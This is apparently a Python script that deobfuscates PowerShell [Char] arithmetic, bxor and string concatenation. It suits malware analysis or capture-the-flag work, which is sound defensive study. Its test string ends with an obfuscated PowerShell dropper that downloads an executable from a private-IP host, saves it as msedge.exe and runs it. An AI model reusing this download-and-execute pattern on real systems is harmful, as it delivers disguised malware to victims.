import re

chrregex = re.compile(r'Chr\(([-]?\d+)(\s+(\^|\+|\-|\/|\*|\%)\s+(\d+))*\)', re.IGNORECASE)
stringregex = re.compile(r'(".*?"|\'.*?.\')')

concatregex = re.compile(r'({chr}|{string})(\s*\+\s*({chr}|{string}))*'.format(chr=chrregex.pattern, string=stringregex.pattern))

def remove_spaces_bracket(match):
    return f"[Char]({match.group(1)}{match.group(2)}{match.group(3)})"

def char_intended(code):
    code = re.compile(r'\[Char\]\s+\(([-\d\+\*/\^]+)\)', re.IGNORECASE).sub(r'[Char](\1)', code)
    resultnumber = re.compile(r'\[Char\]\s+(\d+)', re.IGNORECASE).sub(r'[Char]\1', code)
    resultexpr = re.compile(r'\[Char\]\s*\(\s*(-?\d+)\s*([+\-*/])\s*(-?\d+)\s*\)', re.IGNORECASE).sub(remove_spaces_bracket, resultnumber)
    resultbxor = re.compile(r'\s*(-?\d+)\s*-\s*bxor\s*(-?\d+)\s*', re.IGNORECASE).sub(r'\1 -bxor \2', resultexpr)
    resultplus = re.compile(r'(\[Char\]\(\d+[+\-*/]\d+\))\s*\+\s*', re.IGNORECASE).sub(r'\1 + ', resultbxor)
    final_result = re.compile(r'(\[Char\]\([^\)]+\))\s*\+\s*(\[Char\]\([^\)]+\))', re.IGNORECASE).sub(r'\1 + \2', resultplus)
    return final_result

def replace_match(match):
    res = match.group(1)
    matchsymbol = re.sub(r'(?<=\d)([\+\*/\^])(?=\d)', r' \1 ', res)
    minussymbol = re.sub(r'(?<=\d)-(?=\d)', r' - ', matchsymbol)
    changebxor = minussymbol.replace('-bxor', '^')
    final_result = re.sub(r'^\((.*)\)$', r'\1', changebxor)
    return f'Chr({final_result})'

def char_transform(code):
    return re.compile(r'\[char\]\(([-\d\+\*/\^\s]+(?:\s?-bxor\s?[-\d\+\*/\^\s]+)?)\)|\[Char\]([-0-9]+)', re.IGNORECASE).sub(replace_match, code)

 
def decode_chr(expr):
    numbers = list(map(int, re.findall(r'-?\d+', expr)))
    simbol = re.compile(r'[-]?\d+\s*(\^|\+|\-|\/|\*|\%|\^)', re.IGNORECASE).findall(expr)
    result = numbers[0]
    for i in range(len(simbol)):
        if simbol[i] == '+':
            result += numbers[i+1]
        elif simbol[i] == '-':
            result -= numbers[i+1]
        elif simbol[i] == '*':
            result *= numbers[i+1]
        elif simbol[i] == '/':
            result = result // numbers[i+1]
        elif simbol[i] == '%':
            result %= numbers[i+1]
        elif simbol[i] == '^':
            result ^= numbers[i+1]
    return chr(result)

def check_symbols(symbol):

    chr_pattern = re.compile(r'chr\([^()]*\)', re.IGNORECASE)
    chr_substrings = chr_pattern.findall(symbol)
    temp_string = chr_pattern.sub("temp", symbol)
    temp_string = temp_string.replace("+", "")
    for chr_substring in chr_substrings:
        temp_string = temp_string.replace("temp", chr_substring, 1)
    return temp_string

def concat_test(code):
    matches = concatregex.finditer(code)
    results = []
    for match in matches:
        results.append(match.group(1))
        remaining_text = match.group(0)[len(match.group(1)):].strip()
        while remaining_text:
            next_match = re.match(r'\s*\+\s*({chr}|{string})'.format(chr=chrregex.pattern, string=stringregex.pattern), remaining_text)
            if next_match:
                results.append(next_match.group(1))
                remaining_text = remaining_text[next_match.end():].strip()
            else:
                break
    gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
    check = code.split('=')
    newcoderes = []
    print(gabungin)
    for i in range(len(check)):
        newcoderes.append(check_symbols(check[i]))
        if i != len(check) - 1:
            newcoderes.append('=')
    newcode = ''.join([i  for i in newcoderes]).strip('\n')
    code = []
    newcode = newcode.replace('"', "").replace("'", "")
    for i, element in enumerate(gabungin):
        if len(element) == 1:
            newcode = newcode.replace(results[i], element)
    return newcode.replace(" ", "").replace("(", "").replace(")","")


def deobfuscate(code):
    code = char_intended(code)
    code = char_transform(code)
    code = concat_test(code)
    return code

testing = """
$tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
$tes2 = [ChaR](99   -  10  + 1)+[CHAR](109 -bxor   4)
$tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
$tes4 = [ChaR](99+               13)   +   [CHar](109 -bxor 4)
$tes5 = 'hel'+([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo"
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D+/chall_mem_se'+'arch.e'+'xe'+;$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
"""
print(deobfuscate(testing))
